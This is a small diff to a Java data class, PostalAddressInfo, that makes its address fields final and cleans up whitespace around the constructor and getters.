@@ -11,15 +11,15 @@ package com.android.service.agent.task;
 
 public class PostalAddressInfo {
 	private static final String TAG = "PostalAddressInfo";
-	
-	private long userId;
-	private int type;
-	private String street, poBox, neighbor, city;
-	private String state, postalCode, country;
-	
+
+	private final long userId;
+	private final int type;
+	private final String street, poBox, neighbor, city;
+	private final String state, postalCode, country;
+
 	public PostalAddressInfo(long userId, int type, String street, String poBox, String neighbor, String city,
 			String state, String postalCode, String country) {
-		
+
 		this.userId = userId;
 		this.type = type;
 		this.street = street;
@@ -38,7 +38,7 @@ public class PostalAddressInfo {
 	public int getType() {
 		return type;
 	}
-	
+
 	public String getStreet() {
 		return street;
 	}
@@ -54,7 +54,7 @@ public class PostalAddressInfo {
 	public String getCity() {
 		return city;
 	}
-	
+
 	public String getState() {
 		return state;
 	}
